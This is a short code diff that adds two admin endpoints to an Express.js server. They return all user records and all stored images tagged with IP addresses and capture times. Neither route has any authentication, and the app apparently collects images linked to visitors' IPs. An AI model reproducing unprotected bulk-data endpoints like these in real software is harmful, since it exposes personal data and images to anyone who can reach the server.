@@ -149,6 +149,43 @@ app.get('/api/images/:ip', async (req, res) => {
   }
 });
 
+// --- Get All Users (Admin) ---
+app.get('/api/admin/users', async (req, res) => {
+  try {
+    const users = await UserData.find({}).sort({ createdAt: -1 });
+    res.status(200).json({
+      success: true,
+      total: users.length,
+      users
+    });
+  } catch (err) {
+    const errorMsg = err instanceof Error ? err.message : String(err);
+    console.error("Get Users Error:", errorMsg);
+    res.status(500).json({ error: "Internal Server Error" });
+  }
+});
+
+// --- Get All Images (Admin) ---
+app.get('/api/admin/images', async (req, res) => {
+  try {
+    const images = await ImageModel.find({}).sort({ capturedAt: -1 });
+    res.status(200).json({
+      success: true,
+      total: images.length,
+      images: images.map(img => ({
+        id: img._id,
+        ip: img.ip,
+        imageData: img.imageData,
+        capturedAt: img.capturedAt
+      }))
+    });
+  } catch (err) {
+    const errorMsg = err instanceof Error ? err.message : String(err);
+    console.error("Get All Images Error:", errorMsg);
+    res.status(500).json({ error: "Internal Server Error" });
+  }
+});
+
 const PORT = parseInt(process.env.PORT || '10000', 10);
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`📡 Server active on port ${PORT}`);
